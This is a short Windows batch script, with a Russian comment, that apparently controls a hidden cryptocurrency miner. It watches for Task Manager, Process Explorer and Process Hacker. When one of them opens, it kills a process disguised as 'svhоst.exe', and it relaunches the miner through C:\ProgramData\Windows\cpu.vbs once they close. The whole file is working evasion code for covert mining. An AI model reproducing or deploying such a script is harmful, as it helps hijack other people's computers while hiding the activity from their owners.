    @echo off (после @ пробела не нужно)

    SETLOCAL EnableExtensions

    :start

    set EXE=taskmgr.exe

    set EXE1=Taskmgr.exe

    set EXE2=procexp64.exe

    set EXE3=ProcessHacker.exe

    FOR /F %%x IN ('tasklist /NH /FI "IMAGENAME eq %EXE%"') DO IF %%x == %EXE% goto Found

    FOR /F %%x IN ('tasklist /NH /FI "IMAGENAME eq %EXE1%"') DO IF %%x == %EXE1% goto Found

    FOR /F %%x IN ('tasklist /NH /FI "IMAGENAME eq %EXE2%"') DO IF %%x == %EXE2% goto Found

    FOR /F %%x IN ('tasklist /NH /FI "IMAGENAME eq %EXE3%"') DO IF %%x == %EXE3% goto Found

    goto NotFound


    :NotFound

    timeout /t 1 /nobreak

    cls

    goto checkMINE


    :Found

    taskkill /F /IM svhоst.exe

    timeout /t 1 /nobreak

    cls

    goto start


    :checkMINE

    set prog=svhоst.exe


    FOR /F %%x IN ('tasklist /NH /FI "IMAGENAME eq %prog%"') DO IF %%x == %prog% goto MineON

    goto MineOFF


    :MineON

    CLS

    goto start


    :MineOFF

    start C:\ProgramData\Windows\cpu.vbs

    goto start


